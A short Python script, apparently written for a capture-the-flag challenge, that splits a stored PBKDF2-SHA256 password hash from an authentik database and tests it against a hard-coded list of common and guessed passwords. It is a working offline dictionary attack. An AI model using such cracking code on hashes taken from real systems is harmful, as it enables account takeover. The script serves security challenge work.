import hashlib
import base64

# The hash from the database
stored_hash = "pbkdf2_sha256$870000$OOBQQ0WfV9HTkHDY0WgR1$thO4lAEMVLxiz++zumI6DNOLVVpRW/3oh8IR4j+oC6E="

# Parse the hash
algorithm, iterations, salt, hash_b64 = stored_hash.split("$")
iterations = int(iterations)
salt_bytes = salt.encode("utf-8")
expected_hash = base64.b64decode(hash_b64)

# Common passwords to try
passwords = [
    "admin",
    "password",
    "akadmin",
    "Password123!",
    "authentik",
    "123456",
    "password123",
    "admin123",
    "12345678",
    "qwerty",
    "letmein",
    "welcome",
    "monkey",
    "1234",
    "test",
    "root",
    "toor",
    "passw0rd",
    "administrator",
    "user",
    "akadmin123",
    "Akadmin123!",
    "Admin123!",
    "P@ssw0rd",
    "",
    "a",
    "akadmin!",
    "flaggetter",
    "infobahn",
    "ctf",
    "flag",
    "saml",
    "Infobahn123!",
    "CTF2024",
    "Authentik123!",
    "default",
    "change me",
    "changeme",
]

print(
    f"Testing {len(passwords)} passwords against PBKDF2-SHA256 with {iterations} iterations..."
)
print(f"Salt: {salt}")
print()

for i, pwd in enumerate(passwords, 1):
    pwd_bytes = pwd.encode("utf-8")
    computed_hash = hashlib.pbkdf2_hmac("sha256", pwd_bytes, salt_bytes, iterations)

    if computed_hash == expected_hash:
        print(f"[+] PASSWORD FOUND: '{pwd}'")
        break

    if i % 10 == 0:
        print(f"Tested {i}/{len(passwords)}...")
else:
    print("[-] Password not found in common list")
    print("\nTrying with rockyou top 100...")
